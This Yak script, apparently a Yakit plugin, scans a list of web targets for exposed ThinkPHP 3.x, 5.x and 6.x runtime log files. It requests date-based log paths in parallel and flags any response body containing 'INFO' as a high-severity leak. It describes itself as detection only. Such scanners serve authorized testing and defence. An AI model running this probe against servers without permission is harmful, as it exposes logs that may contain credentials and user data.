yakit.AutoInitYakit()

# thinkphp 日志泄露 V0.2
# 目前只做到检测
# todo 利用
proxyStr = cli.String("proxy")
target = cli.Text("targets",cli.setRequired(true))
cli.check()

//发包函数
sendPacket = func(addr,path,payload,isTls,proxy) {
    return poc.HTTP(`GET {{params(path)}}/{{params(payload)}} HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0`,
        poc.params({
            "path": path,
            "addr": addr,
            "payload": payload,
        }),
        poc.timeout(10), poc.proxy(proxy...), poc.https(isTls),
    )
}


urlAnalyze = func(url){
    ret ={}
    // 获得host、port、addr
    host, port, _ = str.ParseStringToHostPort(url)
    //判断https
    isHttps = false
    addr = str.HostPort(host, port)
    if str.HasPrefix(url, "http://") || str.HasPrefix(url, "https://") {
        isHttps = str.HasPrefix(url, "https://")
    } else{
        isHttps = str.IsTLSServer(url)
    }
    // 获得path  /opt
    path = str.ParseStringUrlToUrlInstance(url)[0].Path 
    ret["host"] = host
    ret["port"] = port
    ret["addr"] = addr
    ret["path"] = path
    ret["isHttps"] = isHttps
    return ret
}

proxy = make([]string)
if proxyStr != "" {
    yakit.Info("使用代理：%v", proxyStr)
    proxy = str.ParseStringToHosts(proxyStr)
}

sendPayload = func(targetInfo,payloads,name){
    //发送payload 
    //name 为漏洞名称
    for _,p := range payloads {
        rsp, req , err = sendPacket(
            targetInfo["addr"],
            targetInfo["path"],
            p,
            targetInfo["isHttps"],
            proxy)
        if err != nil  {
                return
            }
        hrsp,err = poc.ParseBytesToHTTPResponse(rsp)
        if err != nil  {
                return
            }
        // 检测规则
        status_code = hrsp.StatusCode //int
        text,err = str.ExtractBodyFromHTTPResponseRaw(rsp)
        if err != nil  {
                return
            }
        if (str.Contains(string(text),"INFO")) {
            yakit.Info("[+] 目标：%v 存在漏洞 %v", targetInfo["addr"],name)
            yakit.StatusCard("发现漏洞", targetInfo["addr"])
            risk.NewRisk(
                targetInfo["addr"], 
                risk.description("thinkphp 日志泄漏"),
                risk.solution(""),
                risk.severity("high"), 
                risk.title(name),
                risk.type("info-exposure"), 
                risk.payload(p), risk.details({
                    "request": req,
                    "response": rsp,
                    "url": sprintf("%v%v",t,p) ,
                }),
            )
            break
        }

    }
}

//获取时间
year:=sprintf("%v",time.Now().Year())        //年 2022
year2 := year[2:]                              //22
month:=sprintf("%02d",time.Now().Month())       //月 09
day:=sprintf("%02d",time.Now().Day())         //日    03



thinkphp_5_payload = func(){
    //生成 5.x 的payload
    payloads = []
    suf = [".log","_cli.log","_error.log","_sql.log"]
    for _,s := range suf {
        payload = sprintf("runtime/log/%v%v/%v%v",year,month,day,s)
        payloads = append(payloads, payload)
    }
    return payloads
}
thinkphp_3_payload = func(){
    //生成 3.x 的payload
    payloads = []
    pre = ["Runtime/Logs/","Runtime/Logs/Home/","Runtime/Logs/Common/","App/Runtime/Logs/","App/Runtime/Logs/Home/","Application/Runtime/Logs/","Application/Runtime/Logs/Admin/","Application/Runtime/Logs/Home/","Application/Runtime/Logs/App/","Application/Runtime/Logs/Ext/","Application/Runtime/Logs/Api/","Application/Runtime/Logs/Test/","Application/Runtime/Logs/Common/","Application/Runtime/Logs/Service/"]
    for _,s := range pre {
        payload = sprintf("%v%v_%v_%v.log",s,year2,month,day)
        payloads = append(payloads, payload)
    }
    return payloads
}

thinkphp_6_payload = func(){
    //生成 6.x 的payload
    payloads = []
    pre = ["runtime/log/Home/","runtime/log/Common/","runtime/log/Admin/"]
    for _,s := range pre {
        payload = sprintf("%v%v%v/%v.log",s,year,month,day)
        payloads = append(payloads, payload)
    }
    return payloads
}
targets = str.Split(target, "\r\n")

count = 0
total = len(targets)
wg = sync.NewSizedWaitGroup(10)
lock = sync.NewLock()

for _,t := range targets{
    wg.Add()
    targetInfo = urlAnalyze(t)
    func(targetInfo){
        go func{
            defer wg.Done()
            //检测Thinkphp 5.x
            sendPayload(targetInfo,thinkphp_5_payload(),"Thinkphp 5.x 日志泄露")

            //检测Thinkphp 3.x
            sendPayload(targetInfo,thinkphp_3_payload(),"Thinkphp 3.x 日志泄露")

            //检测Thinkphp 6.x
            sendPayload(targetInfo,thinkphp_6_payload(),"Thinkphp 6.x 日志泄露")
            yakit.Info(sprintf("剩余待检测数:%v",total-count))
            lock.Lock()
            count++
            lock.Unlock()
        }
    }(targetInfo)

}
wg.Wait()
